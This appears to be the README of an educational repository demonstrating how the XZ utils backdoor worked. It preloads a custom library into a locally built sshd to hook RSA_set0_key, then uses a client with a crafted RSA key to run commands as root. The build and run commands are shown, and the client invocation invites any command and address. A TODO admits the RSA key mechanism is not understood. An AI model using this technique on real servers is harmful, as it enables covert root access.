# XZ utils backdoor

This repository aims to show how the [XZ utils backdoor](https://en.wikipedia.org/wiki/XZ_Utils_backdoor) worked. This repo focusses on how to malicious code is loaded during runtime, not on how it was hidden in the liblzma library. It is not an exact replication with the affected source code, but instead a malicious library is force loaded when running sshd. In the real attack the malicious code was loaded by the liblzma library, resulting in a supply chain attack. This repository uses its own malicious library to simplify things a bit, and to make it more clear how the attack works. So while it is not identical to the real attack, it does use exactly the same mechanics. Another reason to do this is versions. Since the discovery of the backdoor a lot of new versions of sshd have been release. Since the signature of the source code changed quite a bit, the old attack will not work with the new version of sshd, but by creating our own, we can tailor it to the current latest version of sshd.

## The attack

The way the original attack worked was by overriding a signature of a method another library. Because the compromised library would be loaded earlier, this method would be called instead of the original. In this method there was a check for a specific pattern in the key. If this specific key was not found it would just call the original method and stay undetected. However if the pattern was detected in the key, it would decode the key, retrieving the payload. It would then execute this payload as a command. Since this part of sshd runs as root, this allowed for unlimited access on the victim machine.

In this demo we don't override the method by modifying on of the dependencies of sshd, but instead forcing it to load our own library. This library will then override the `RSA_set0_key` method from the openssl library. The sshd process will the call our method instead of the original, and the attack will be executed. To allow our attack to be stealthy and only trigger for the attacker, we create a modified RSA key. This RSA key has a modulus that is impossible to exist in a valid RSA key. This way it only triggers for us, since nobody else will use a invalid key.

## RSA key

todo

<!---
TODO: find out how the RSA key works with the magic bit and stuff. I did this mostly with AI and with the xz_bot repo so im not sure how that exactly goes
-->

## The demo

To run the demo we use openssh-portable. We compile this with some extra options that make running it a bit easier. The we run it while forcing it to load our compiled rust library. The we use the Go client to connect with the correct RSA key.

### dependencies

The easiest way to install all dependencies is with the nix package manager. Just run `nix-shell shell.nix` in the root of the project. Run all other command in this shell. If nix is not an option, you'll have to install all the dependencies manually. The nix.shell file has a list that can be followed.

### Library.

To compile the library, go into the ssh_backdoor_trigger folder, and compile:

```
cd ssh_backdoor_trigger
cargo build --release
```

### Openssh

From root run these commands:

```
git clone https://github.com/openssh/openssh-portable
cd openssh-portable

# optional, but ensures it uses the exact version the library was made for
git checkout V_10_2_P1

autoreconf

# the options here allow ssh to run with the nobody user (that is installed on a lot of systems)
# if this user does not exist on your system you can change it to one that does
# it also sets the execution directory to the current directory
# these options do not change sshd, just make it easier to run.
./configure --with-privsep-user=nobody --libexecdir="$(pwd)"
make

# the LD_PRELOAD environment variable forces the process to first look at our library
# only after our library it looks anywhere else when looking for symbols
sudo LD_PRELOAD="$(pwd)/../ssh_backdoor_trigger/target/release/libtrigger.so" \
    "$(pwd)/sshd" \
    -f /dev/null \
    -D -ddd \
    -p 2222 \
    -h "$(pwd)/../test_conf/ssh_host_ed25519_key" \
    -o PidFile="$(pwd)/../test_conf/sshd.pid" \
    -o AuthorizedKeysFile="$(pwd)/../test_conf/authorized_keys" \
    -o StrictModes=no \
    -o UsePrivilegeSeparation=no \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa
```

### The client

To now exploit the vulnerable server use the go script

In the ssh_backdoor_client folder run:

```
go run . -cmd "id > /tmp/fasdfasdf" -addr 127.0.0.1:2222
```

You can change the command and address to whatever you like to use
